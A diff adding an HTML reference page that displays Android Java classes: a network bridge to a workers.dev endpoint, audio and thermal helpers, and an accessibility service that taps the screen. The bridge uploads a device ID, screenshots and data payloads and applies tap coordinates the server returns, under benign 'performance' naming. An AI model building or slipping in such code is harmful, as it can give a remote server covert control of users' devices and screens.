@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Android Java Code Reference</title>
+  <style>
+    :root {
+      --bg-color: #0f172a;
+      --card-bg: #1e293b;
+      --code-bg: #090d16;
+      --accent: #38bdf8;
+      --text: #f8fafc;
+      --border: #334155;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text);
+      margin: 0;
+      padding: 24px;
+    }
+
+    h1 {
+      color: var(--accent);
+      font-size: 1.75rem;
+      margin-bottom: 8px;
+    }
+
+    p.subtitle {
+      color: #94a3b8;
+      margin-bottom: 24px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+    }
+
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+
+    h2 {
+      margin: 0;
+      font-size: 1.2rem;
+      color: #e2e8f0;
+    }
+
+    .copy-btn {
+      background: #0284c7;
+      color: white;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+
+    .copy-btn:hover {
+      background: #0369a1;
+    }
+
+    pre {
+      background: var(--code-bg);
+      border: 1px solid #1e293b;
+      padding: 16px;
+      border-radius: 6px;
+      overflow-x: auto;
+      margin: 0;
+    }
+
+    code {
+      font-family: "Fira Code", Consolas, Monaco, "Andale Mono", monospace;
+      font-size: 0.88rem;
+      color: #4ade80;
+      white-space: pre;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Android Java Source Code Repository</h1>
+  <p class="subtitle">Stored inside JS strings for quick reading and reference.</p>
+
+  <div id="codeContainer"></div>
+
+  <script>
+    // =========================================================================
+    // JAVA CODES STORED INSIDE JAVASCRIPT STRINGS
+    // =========================================================================
+
+    const javaCodes = {
+      workerBridge: {
+        title: "1. WorkerBridge.java (Cloudflare Network Manager)",
+        code: `package com.example.performance;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+
+public class WorkerBridge {
+
+    private static final String BASE_URL = "https://winter-lake-cbbd.trustconnect713.workers.dev";
+
+    public interface AudioCallback {
+        void onSuccess(double gain, int bufferSizeMs);
+        void onError(Exception e);
+    }
+
+    public interface ThermalCallback {
+        void onSuccess(JSONArray processedData);
+        void onError(Exception e);
+    }
+
+    public interface AgentCallback {
+        void onSuccess(JSONObject executionPlan);
+        void onError(Exception e);
+    }
+
+    // Audio Routing Configuration Fetch
+    public static void fetchAudioConfig(String deviceUid, String appSource, String thermalStatus, AudioCallback callback) {
+        new Thread(() -> {
+            try {
+                URL url = new URL(BASE_URL + "/api/audio/config");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setRequestProperty("X-Device-UID", deviceUid);
+                conn.setRequestProperty("X-App-Source", appSource);
+                conn.setRequestProperty("X-Thermal-Status", thermalStatus);
+                conn.setConnectTimeout(5000);
+
+                if (conn.getResponseCode() == 200) {
+                    String res = readStream(conn);
+                    JSONObject json = new JSONObject(res);
+                    callback.onSuccess(json.optDouble("recommendedGain", 1.0), json.optInt("bufferSizeMs", 250));
+                } else {
+                    callback.onError(new Exception("HTTP Error: " + conn.getResponseCode()));
+                }
+                conn.disconnect();
+            } catch (Exception e) {
+                callback.onError(e);
+            }
+        }).start();
+    }
+
+    // Thermal Data Offloading Engine
+    public static void sendThermalOffload(String deviceUid, String thermalStatus, JSONArray heavyPayload, ThermalCallback callback) {
+        new Thread(() -> {
+            try {
+                URL url = new URL(BASE_URL + "/api/thermal/offload");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setRequestProperty("X-Device-UID", deviceUid);
+                conn.setRequestProperty("X-Thermal-Status", thermalStatus);
+                conn.setDoOutput(true);
+
+                JSONObject body = new JSONObject();
+                body.put("payload", heavyPayload);
+
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(body.toString().getBytes(StandardCharsets.UTF_8));
+                }
+
+                if (conn.getResponseCode() == 200) {
+                    String res = readStream(conn);
+                    JSONObject json = new JSONObject(res);
+                    callback.onSuccess(json.optJSONArray("result"));
+                } else {
+                    callback.onError(new Exception("HTTP Error: " + conn.getResponseCode()));
+                }
+                conn.disconnect();
+            } catch (Exception e) {
+                callback.onError(e);
+            }
+        }).start();
+    }
+
+    // Autonomous AI Screen Action Request
+    public static void requestAiDecision(String deviceUid, String base64Image, String task, int width, int height, AgentCallback callback) {
+        new Thread(() -> {
+            try {
+                URL url = new URL(BASE_URL + "/api/agent/decide");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setRequestProperty("X-Device-UID", deviceUid);
+                conn.setDoOutput(true);
+
+                JSONObject body = new JSONObject();
+                body.put("screenshotBase64", base64Image);
+                body.put("userTask", task);
+                body.put("screenWidth", width);
+                body.put("screenHeight", height);
+
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(body.toString().getBytes(StandardCharsets.UTF_8));
+                }
+
+                if (conn.getResponseCode() == 200) {
+                    String res = readStream(conn);
+                    JSONObject json = new JSONObject(res);
+                    callback.onSuccess(json.optJSONObject("executionPlan"));
+                } else {
+                    callback.onError(new Exception("HTTP Error: " + conn.getResponseCode()));
+                }
+                conn.disconnect();
+            } catch (Exception e) {
+                callback.onError(e);
+            }
+        }).start();
+    }
+
+    private static String readStream(HttpURLConnection conn) throws Exception {
+        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+        StringBuilder response = new StringBuilder();
+        String line;
+        while ((line = in.readLine()) != null) response.append(line);
+        in.close();
+        return response.toString();
+    }
+}`
+      },
+
+      appAudioManager: {
+        title: "2. AppAudioManager.java (Per-App Audio Channel Controller)",
+        code: `package com.example.performance;
+
+import android.content.Context;
+import android.media.AudioAttributes;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
+import android.util.Log;
+
+public class AppAudioManager {
+
+    private final Context context;
+    private final AudioManager systemAudioManager;
+    private MediaPlayer mediaPlayer;
+
+    public AppAudioManager(Context context) {
+        this.context = context;
+        this.systemAudioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+    }
+
+    public void startAudioStream(int audioResId, String appSource, String deviceUid, String thermalStatus) {
+        WorkerBridge.fetchAudioConfig(deviceUid, appSource, thermalStatus, new WorkerBridge.AudioCallback() {
+            @Override
+            public void onSuccess(double gain, int bufferSizeMs) {
+                Log.d("AppAudio", "Applying Gain: " + gain + " | Buffer: " + bufferSizeMs + "ms");
+
+                if (mediaPlayer != null) mediaPlayer.release();
+
+                AudioAttributes attributes = new AudioAttributes.Builder()
+                        .setUsage(AudioAttributes.USAGE_MEDIA)
+                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
+                        .build();
+
+                mediaPlayer = MediaPlayer.create(context, audioResId, attributes, systemAudioManager.generateAudioSessionId());
+                if (mediaPlayer != null) {
+                    float floatGain = (float) Math.min(Math.max(gain, 0.0), 1.0);
+                    mediaPlayer.setVolume(floatGain, floatGain);
+                    mediaPlayer.start();
+                }
+            }
+
+            @Override
+            public void onError(Exception e) {
+                Log.e("AppAudio", "Error loading config, using default volume", e);
+            }
+        });
+    }
+
+    public void stop() {
+        if (mediaPlayer != null) {
+            mediaPlayer.stop();
+            mediaPlayer.release();
+            mediaPlayer = null;
+        }
+    }
+}`
+      },
+
+      thermalManager: {
+        title: "3. ThermalManager.java (Hardware Heat Monitor & Offloader)",
+        code: `package com.example.performance;
+
+import android.content.Context;
+import android.os.Build;
+import android.os.PowerManager;
+import android.util.Log;
+import org.json.JSONArray;
+
+public class ThermalManager {
+
+    private static final String TAG = "ThermalManager";
+    private final Context context;
+    private String currentThermalStatus = "NORMAL";
+
+    public ThermalManager(Context context) {
+        this.context = context;
+        initThermalListener();
+    }
+
+    private void initThermalListener() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                pm.addThermalStatusListener(status -> {
+                    switch (status) {
+                        case PowerManager.THERMAL_STATUS_NONE:
+                        case PowerManager.THERMAL_STATUS_LIGHT:
+                            currentThermalStatus = "NORMAL";
+                            break;
+                        case PowerManager.THERMAL_STATUS_MODERATE:
+                            currentThermalStatus = "MODERATE";
+                            break;
+                        case PowerManager.THERMAL_STATUS_SEVERE:
+                        case PowerManager.THERMAL_STATUS_CRITICAL:
+                        case PowerManager.THERMAL_STATUS_EMERGENCY:
+                            currentThermalStatus = "SEVERE";
+                            break;
+                    }
+                    Log.d(TAG, "Hardware Thermal Status Updated: " + currentThermalStatus);
+                });
+            }
+        }
+    }
+
+    public String getCurrentThermalStatus() {
+        return currentThermalStatus;
+    }
+
+    public void processDataPayload(String deviceUid, JSONArray rawPayload, WorkerBridge.ThermalCallback callback) {
+        WorkerBridge.sendThermalOffload(deviceUid, currentThermalStatus, rawPayload, callback);
+    }
+}`
+      },
+
+      uiAutomationService: {
+        title: "4. UiAutomationService.java (Accessibility Tap Agent)",
+        code: `package com.example.performance;
+
+import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.GestureDescription;
+import android.graphics.Path;
+import android.os.Build;
+import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
+import org.json.JSONObject;
+
+public class UiAutomationService extends AccessibilityService {
+
+    private static final String TAG = "UiAutomationService";
+    private static UiAutomationService instance;
+
+    @Override
+    protected void onServiceConnected() {
+        super.onServiceConnected();
+        instance = this;
+        Log.d(TAG, "Accessibility Automation Service Connected");
+    }
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {}
+
+    @Override
+    public void onInterrupt() {}
+
+    public static UiAutomationService getInstance() {
+        return instance;
+    }
+
+    public void executeAction(JSONObject executionPlan) {
+        try {
+            String action = executionPlan.optString("action", "click");
+            int x = executionPlan.optInt("x", 0);
+            int y = executionPlan.optInt("y", 0);
+
+            if ("click".equalsIgnoreCase(action) && x > 0 && y > 0) {
+                dispatchTapGesture(x, y);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to execute UI Action", e);
+        }
+    }
+
+    private void dispatchTapGesture(int x, int y) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            Path path = new Path();
+            path.moveTo(x, y);
+
+            GestureDescription.StrokeDescription stroke = 
+                    new GestureDescription.StrokeDescription(path, 0, 100);
+
+            GestureDescription.Builder builder = new GestureDescription.Builder();
+            builder.addStroke(stroke);
+
+            dispatchGesture(builder.build(), new GestureResultCallback() {
+                @Override
+                public void onCompleted(GestureDescription gestureDescription) {
+                    Log.d(TAG, "Screen tap dispatched at X: " + x + " Y: " + y);
+                }
+            }, null);
+        }
+    }
+}`
+      }
+    };
+
+    // =========================================================================
+    // DYNAMIC RENDERING TO WEB PAGE
+    // =========================================================================
+
+    const container = document.getElementById("codeContainer");
+
+    Object.keys(javaCodes).forEach(key => {
+      const item = javaCodes[key];
+
+      const card = document.createElement("div");
+      card.className = "card";
+
+      const header = document.createElement("div");
+      header.className = "card-header";
+
+      const title = document.createElement("h2");
+      title.textContent = item.title;
+
+      const copyBtn = document.createElement("button");
+      copyBtn.className = "copy-btn";
+      copyBtn.textContent = "Copy Code";
+      copyBtn.onclick = () => copyToClipboard(item.code, copyBtn);
+
+      header.appendChild(title);
+      header.appendChild(copyBtn);
+
+      const pre = document.createElement("pre");
+      const code = document.createElement("code");
+      code.textContent = item.code;
+
+      pre.appendChild(code);
+      card.appendChild(header);
+      card.appendChild(pre);
+
+      container.appendChild(card);
+    });
+
+    function copyToClipboard(text, btn) {
+      navigator.clipboard.writeText(text).then(() => {
+        const originalText = btn.textContent;
+        btn.textContent = "Copied!";
+        btn.style.background = "#16a34a";
+        setTimeout(() => {
+          btn.textContent = originalText;
+          btn.style.background = "#0284c7";
+        }, 2000);
+      });
+    }
+  </script>
+</body>
+</html>
